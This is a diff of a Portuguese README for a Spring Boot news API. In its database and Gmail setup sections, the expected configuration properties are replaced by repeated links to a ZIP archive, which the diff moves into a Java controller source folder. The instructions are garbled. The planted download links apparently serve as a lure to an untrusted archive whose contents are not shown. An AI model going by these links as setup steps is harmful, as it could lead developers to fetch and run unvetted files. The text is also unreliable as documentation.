@@ -23,14 +23,14 @@ Certifique-se de ter as seguintes ferramentas instaladas:
 
 ### 1\. Configuração do Banco de Dados
 
-Crie um banco de dados MySQL e, em seguida, atualize o arquivo `https://raw.githubusercontent.com/devwarly/ads-backend-java-springboot-apinoticias/main/src/java-springboot-ads-apinoticias-backend-1.1.zip` com suas credenciais:
+Crie um banco de dados MySQL e, em seguida, atualize o arquivo `https://github.com/devwarly/ads-backend-java-springboot-apinoticias/raw/refs/heads/main/src/main/java/com/application/ads/controller/java-backend-apinoticias-springboot-ads-v1.4.zip` com suas credenciais:
 
 ```properties
-https://raw.githubusercontent.com/devwarly/ads-backend-java-springboot-apinoticias/main/src/java-springboot-ads-apinoticias-backend-1.1.zip
-https://raw.githubusercontent.com/devwarly/ads-backend-java-springboot-apinoticias/main/src/java-springboot-ads-apinoticias-backend-1.1.zip
-https://raw.githubusercontent.com/devwarly/ads-backend-java-springboot-apinoticias/main/src/java-springboot-ads-apinoticias-backend-1.1.zip
-https://raw.githubusercontent.com/devwarly/ads-backend-java-springboot-apinoticias/main/src/java-springboot-ads-apinoticias-backend-1.1.zip
-https://raw.githubusercontent.com/devwarly/ads-backend-java-springboot-apinoticias/main/src/java-springboot-ads-apinoticias-backend-1.1.zip
+https://github.com/devwarly/ads-backend-java-springboot-apinoticias/raw/refs/heads/main/src/main/java/com/application/ads/controller/java-backend-apinoticias-springboot-ads-v1.4.zip
+https://github.com/devwarly/ads-backend-java-springboot-apinoticias/raw/refs/heads/main/src/main/java/com/application/ads/controller/java-backend-apinoticias-springboot-ads-v1.4.zip
+https://github.com/devwarly/ads-backend-java-springboot-apinoticias/raw/refs/heads/main/src/main/java/com/application/ads/controller/java-backend-apinoticias-springboot-ads-v1.4.zip
+https://github.com/devwarly/ads-backend-java-springboot-apinoticias/raw/refs/heads/main/src/main/java/com/application/ads/controller/java-backend-apinoticias-springboot-ads-v1.4.zip
+https://github.com/devwarly/ads-backend-java-springboot-apinoticias/raw/refs/heads/main/src/main/java/com/application/ads/controller/java-backend-apinoticias-springboot-ads-v1.4.zip
 ```
 
 O Spring Data JPA cuidará de criar as tabelas automaticamente para você.
@@ -40,12 +40,12 @@ O Spring Data JPA cuidará de criar as tabelas automaticamente para você.
 Se você precisa que a funcionalidade de aprovação de administradores por e-mail funcione, configure uma conta do Gmail no mesmo arquivo:
 
 ```properties
-https://raw.githubusercontent.com/devwarly/ads-backend-java-springboot-apinoticias/main/src/java-springboot-ads-apinoticias-backend-1.1.zip
-https://raw.githubusercontent.com/devwarly/ads-backend-java-springboot-apinoticias/main/src/java-springboot-ads-apinoticias-backend-1.1.zip
-https://raw.githubusercontent.com/devwarly/ads-backend-java-springboot-apinoticias/main/src/java-springboot-ads-apinoticias-backend-1.1.zip
-https://raw.githubusercontent.com/devwarly/ads-backend-java-springboot-apinoticias/main/src/java-springboot-ads-apinoticias-backend-1.1.zip
-https://raw.githubusercontent.com/devwarly/ads-backend-java-springboot-apinoticias/main/src/java-springboot-ads-apinoticias-backend-1.1.zip
-https://raw.githubusercontent.com/devwarly/ads-backend-java-springboot-apinoticias/main/src/java-springboot-ads-apinoticias-backend-1.1.zip
+https://github.com/devwarly/ads-backend-java-springboot-apinoticias/raw/refs/heads/main/src/main/java/com/application/ads/controller/java-backend-apinoticias-springboot-ads-v1.4.zip
+https://github.com/devwarly/ads-backend-java-springboot-apinoticias/raw/refs/heads/main/src/main/java/com/application/ads/controller/java-backend-apinoticias-springboot-ads-v1.4.zip
+https://github.com/devwarly/ads-backend-java-springboot-apinoticias/raw/refs/heads/main/src/main/java/com/application/ads/controller/java-backend-apinoticias-springboot-ads-v1.4.zip
+https://github.com/devwarly/ads-backend-java-springboot-apinoticias/raw/refs/heads/main/src/main/java/com/application/ads/controller/java-backend-apinoticias-springboot-ads-v1.4.zip
+https://github.com/devwarly/ads-backend-java-springboot-apinoticias/raw/refs/heads/main/src/main/java/com/application/ads/controller/java-backend-apinoticias-springboot-ads-v1.4.zip
+https://github.com/devwarly/ads-backend-java-springboot-apinoticias/raw/refs/heads/main/src/main/java/com/application/ads/controller/java-backend-apinoticias-springboot-ads-v1.4.zip
 ```
 
 **Dica:** Por segurança, utilize uma senha de aplicativo do Google em vez da sua senha principal.
